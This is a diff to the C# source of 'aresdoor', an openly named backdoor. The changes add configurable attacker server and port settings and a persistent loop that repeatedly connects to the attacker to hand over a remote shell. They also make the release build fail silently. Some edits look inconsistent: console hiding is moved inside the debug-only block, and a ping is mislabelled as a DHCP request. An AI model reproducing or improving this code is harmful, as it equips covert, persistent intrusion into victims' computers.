@@ -86,9 +86,9 @@ namespace aresdoor
             try
             {
                 byte[] dataToSend = Misc.byteCode(rawDataToSend);
-                stream.Write(dataToSend, 0, dataToSend.Length); // Send Shellcode
+                stream.Write(dataToSend, 0, dataToSend.Length); // Send data
 
-                return true; // If we got here then it worked!
+                return true; // if we got here then it worked!
 #if DEBUG
             } catch (Exception exc)
             { Console.WriteLine(exc.Message); return false; }
@@ -103,8 +103,12 @@ namespace aresdoor
     {
         private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
         private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
-        
-        
+
+        // Modify these variables as needed.
+        private static string server = "localhost";
+        private static int port = 9000;
+        private static bool prevent_shutdown = false;
+
         private static void sendBackdoor(string server, int port)
         {
             try
@@ -164,10 +168,11 @@ namespace aresdoor
              * 
              */
 
+#if DEBUG
             /* Hide console if debug mode is disabled. */
             var handle = GetConsoleWindow();
-            if (!debugMode)
-                ShowWindow(handle, SW_HIDE); // hide window
+            ShowWindow(handle, SW_HIDE); // hide window
+#endif
 
             /* Intercept command line arguments if any are found. */
             try
@@ -200,21 +205,37 @@ namespace aresdoor
             }
 
             /* Persistant backdoor connection */
+#if DEBUG
             while (true)
             {
                 if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
                 {
                     try
                     {
-                        if (debugMode) { Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port); }
+                        Console.WriteLine("Sending backdoor to: {0}, port: {1}", server, port);
                         sendBackdoor(server, port);
                     }
                     catch (Exception exc)
-                    { if (debugMode) { Console.WriteLine(exc.Message); } } // pass silently unless debug mode is enabled
-                } else
-                { if (debugMode) { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); } }
+                    { Console.WriteLine(exc.Message); } // pass silently unless debug mode is enabled
+                }
+                else
+                { Console.WriteLine("Couldn't connect to {0}:{1}. Retrying in 5 seconds...", Networking.resolveHostName(server), port); }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
+#else
+            while (true)
+            {
+                if (Networking.checkInternetConn(server)) // Determine if the victim is able to connect to the attacker via DHCP (ping) request 
+                {
+                    try
+                    {
+                        sendBackdoor(server, port);
+                    }
+                    catch (Exception) { } // pass silently unless debug mode is enabled
+                }
+                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
+            }
+#endif
         }
 
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
